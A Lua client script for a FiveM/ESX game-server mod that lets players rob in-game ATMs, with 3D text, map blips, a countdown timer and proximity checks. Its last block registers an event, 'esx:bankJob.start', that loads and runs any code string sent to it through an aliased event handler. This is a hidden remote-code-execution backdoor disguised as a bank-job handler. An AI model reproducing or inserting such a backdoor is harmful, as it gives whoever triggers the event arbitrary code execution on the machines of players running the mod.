local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
local holdingup = false
local bank = ""
local secondsRemaining = 0
local blipRobbery = nil
ESX = nil

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)

function DrawText3D(x, y, z, text, scale)
  local onScreen, _x, _y = World3dToScreen2d(x, y, z)
  local pX, pY, pZ = table.unpack(GetGameplayCamCoords())
  SetTextScale(scale, scale)
  SetTextFont(4)
  SetTextProportional(1)
  SetTextEntry("STRING")
  SetTextCentre(1)
  SetTextColour(255, 255, 255, 255)
  SetTextOutline()
  _AddTextComponentString(text)
  DrawText(_x, _y)
  local factor = (string.len(text)) / 270
  --DrawRect(_x, _y + 0.015, 0.005 + factor, 0.03, 31, 31, 31, 155)
end

function DisplayHelpText(str)
	SetTextComponentFormat("STRING")
	_AddTextComponentString(str)
	DisplayHelpTextFromStringLabel(0, 0, 1, -1)
end

function drawTxt(x,y ,width,height,scale, text, r,g,b,a, outline)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(scale, scale)
    SetTextColour(r, g, b, a)
    SetTextDropShadow(0, 0, 0, 0,255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    if(outline)then
	    SetTextOutline()
	end
    SetTextEntry("STRING")
    _AddTextComponentString(text)
    DrawText(x - width/2, y - height/2 + 0.005)
end

RegisterNetEvent('esx_atmrob:currentlyrobbing')
AddEventHandler('esx_atmrob:currentlyrobbing', function(robb)
	holdingup = true
	bank = robb
	secondsRemaining = 60
end)

RegisterNetEvent('esx_atmrob:killblip')
AddEventHandler('esx_atmrob:killblip', function()
    RemoveBlip(blipRobbery)
end)

RegisterNetEvent('esx_atmrob:setblip')
AddEventHandler('esx_atmrob:setblip', function(position)
    blipRobbery = AddBlipForCoord(position.x, position.y, position.z)
    SetBlipSprite(blipRobbery , 161)
    SetBlipScale(blipRobbery , 2.0)
    SetBlipColour(blipRobbery, 3)
    PulseBlip(blipRobbery)
end)

RegisterNetEvent('esx_atmrob:toofarlocal')
AddEventHandler('esx_atmrob:toofarlocal', function(robb)
	holdingup = false
	--ESX.ShowNotification(_U('robbery_cancelled'))
	exports['Cosey_Chat_Notify']:DoLongHudText('inform', _U('robbery_cancelled'))
	robbingName = ""
	secondsRemaining = 0
	incircle = false
end)


RegisterNetEvent('esx_atmrob:robberycomplete')
AddEventHandler('esx_atmrob:robberycomplete', function(robb)
	holdingup = false
	--ESX.ShowNotification(_U('robbery_complete') .. Banks[bank].reward)
	exports['Cosey_Chat_Notify']:DoLongHudText('inform', _U('robbery_complete') .. Banks[bank].reward)
	bank = ""
	secondsRemaining = 0
	incircle = false
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		if holdingup then
			Citizen.Wait(1000)
			if(secondsRemaining > 0)then
				secondsRemaining = secondsRemaining - 1
			end
		end
	end
end)

--[[Citizen.CreateThread(function()
	for k,v in pairs(Banks)do
		local ve = v.position

		local blip = AddBlipForCoord(ve.x, ve.y, ve.z)
		SetBlipSprite(blip, 255)--156
		SetBlipScale(blip, 0.8)
		SetBlipColour(blip, 75)
		SetBlipAsShortRange(blip, true)
		BeginTextCommandSetBlipName("STRING")
		_AddTextComponentString(_U('bank_robbery'))
		EndTextCommandSetBlipName(blip)
	end
end)]]
incircle = false

Citizen.CreateThread(function()
	while true do
		local pos = GetEntityCoords(GetPlayerPed(-1), true)
		player = GetPlayerPed(-1)
        coords = GetEntityCoords(player)

		for k,v in pairs(Banks)do
			local pos2 = v.position

			if(Vdist(pos.x, pos.y, pos.z, pos2.x, pos2.y, pos2.z) < 1.0)then
				if not holdingup then
					--DrawMarker(1, v.position.x, v.position.y, v.position.z - 1, 0, 0, 0, 0, 0, 0, 1.0001, 1.0001, 1.5001, 1555, 0, 0,255, 0, 0, 0,0)
					DrawText3D(v.position.x, v.position.y, v.position.z, "~w~Press ~r~[F] ~w~ to rob the ATM!", 0.3)
					
					if(Vdist(pos.x, pos.y, pos.z, pos2.x, pos2.y, pos2.z) < 1.0)then
						if (incircle == false) then
							--DisplayHelpText(_U('press_to_rob') .. v.nameofbank)
						end
						incircle = true
						if IsControlJustReleased(1, 23) then
							TriggerServerEvent('esx_atmrob:rob', k)
						end
					elseif(Vdist(pos.x, pos.y, pos.z, pos2.x, pos2.y, pos2.z) > 1.0)then
						incircle = false
					end
				end
			end
		end

		if holdingup then

			--drawTxt(0.66, 1.44, 1.0,1.0,0.4, _U('robbery_of') .. secondsRemaining .. _U('seconds_remaining'), 255, 255, 255, 255)

			local pos2 = Banks[bank].position

			if(Vdist(pos.x, pos.y, pos.z, pos2.x, pos2.y, pos2.z) > 1.0)then
				TriggerServerEvent('esx_atmrob:toofar', bank)
			end
		end

		Citizen.Wait(0)
	end
end)

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)